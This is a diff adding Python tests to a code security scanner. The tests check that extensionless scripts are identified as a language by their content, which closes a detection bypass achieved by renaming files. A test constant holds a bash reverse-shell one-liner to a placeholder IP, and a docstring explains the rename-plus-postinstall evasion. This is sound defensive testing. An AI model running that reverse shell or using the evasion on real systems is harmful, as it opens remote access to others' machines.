@@ -457,3 +457,84 @@ class TestConfigDetector:
             ConfigDetector(), "src/app.py", "cidr_blocks = ['0.0.0.0/0']", context(rules)
         )
         assert findings == []
+
+
+class TestIdentifyingALanguageWithoutAFilename:
+    """Identification was the filename, then the shebang, and nothing else.
+
+    A file with neither got `language=None`, which means none of the language
+    rules ran on it -- so a bash reverse shell in a file called `postinstall`,
+    or in `payload.dat`, was invisible while the identical bytes in
+    `postinstall.sh` were CRITICAL. That is a one-rename bypass of every
+    behavioural rule the tool has, and a `package.json` declaring
+    `"postinstall": "./postinstall"` is how such a file gets run.
+    """
+
+    REVERSE_SHELL = "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n"
+
+    def test_an_extensionless_script_is_identified_by_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify_from_content(self.REVERSE_SHELL) == "shell"
+
+    def test_python_is_identified_by_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        source = "import socket, subprocess\ndef go(host):\n    return socket.socket()\n"
+        assert LanguageRegistry.identify_from_content(source) == "python"
+
+    def test_javascript_is_identified_by_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        source = 'const net = require("net");\nmodule.exports = { go };\n'
+        assert LanguageRegistry.identify_from_content(source) == "javascript"
+
+    def test_one_marker_is_not_enough(self) -> None:
+        """A single marker is noise: the word import appears in prose about
+        Python, and a redirection appears in a build log. Two of them in one
+        file is a shape data does not have."""
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify_from_content("see the import section\n") is None
+        assert LanguageRegistry.identify_from_content("job failed with 2>&1\n") is None
+
+    def test_prose_and_data_are_not_code(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        for text in (
+            "This project is a library for parsing dates.\n\nIt has no dependencies.\n",
+            '{"name": "thing", "version": "1.0.0"}\n',
+            "id,name,total\n1,alpha,3\n2,beta,4\n",
+            "",
+        ):
+            assert LanguageRegistry.identify_from_content(text) is None
+
+    def test_the_filename_always_wins(self) -> None:
+        """A markdown file is never re-read as shell however much shell it
+        contains. A README documenting an install one-liner that pipes a
+        download into a shell is the single most common shape in open-source
+        documentation, and reading it as a script would report every install
+        guide ever written."""
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify("README.md", text=self.REVERSE_SHELL) == "markdown"
+        assert (
+            LanguageRegistry.identify("x.py", text='const a = require("b");\nmodule.exports = a;\n')
+            == "python"
+        )
+
+    def test_the_shebang_still_beats_the_shape(self) -> None:
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        identified = LanguageRegistry.identify(
+            "installer", shebang="#!/usr/bin/env python3", text=self.REVERSE_SHELL
+        )
+        assert identified == "python"
+
+    def test_no_evidence_is_not_a_guess(self) -> None:
+        """Returning something for a file that looks like nothing points a
+        whole language's rules at content that is not that language, which is
+        a worse answer than none."""
+        from cordon_scanner.langs.registry import LanguageRegistry
+
+        assert LanguageRegistry.identify_from_content("x" * 200) is None
